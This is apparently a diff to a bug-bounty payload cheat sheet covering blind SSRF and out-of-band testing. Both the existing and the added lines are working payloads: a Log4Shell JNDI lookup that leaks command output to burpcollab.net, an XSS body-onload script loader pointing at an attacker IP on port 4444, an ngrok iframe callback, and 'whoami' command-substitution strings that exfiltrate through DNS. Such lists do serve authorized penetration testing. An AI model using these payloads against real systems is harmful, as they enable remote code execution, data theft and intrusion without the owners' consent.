@@ -15,6 +15,7 @@ ${jndi:ldap://${command}XXXX${::-.}.burpcollab.net}zzzz
 <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}}></body>
 ```
 ## Blind SSRF:
+### A. By Ngrok:
 ```
 1. Run ngrok: ./ngrok http 80
 2. Open with Browser: 127.0.01:4040/inspect/http
@@ -22,4 +23,11 @@ ${jndi:ldap://${command}XXXX${::-.}.burpcollab.net}zzzz
 "><img src="xasdasdasd" onerror="document.write('<iframe src=https://d0.ngrok.io></iframe>')"
 
 Ref: https://hackerone.com/reports/517461
+```
+### Others:
+```
+<img src="http://burpcollab.net"></img>
+'whoami'.ddddddd.burpcollab.net
+"whoami".ddddddd.burpcollab.net
+'whoami'.ddddddd@burpcollab.net
 ```
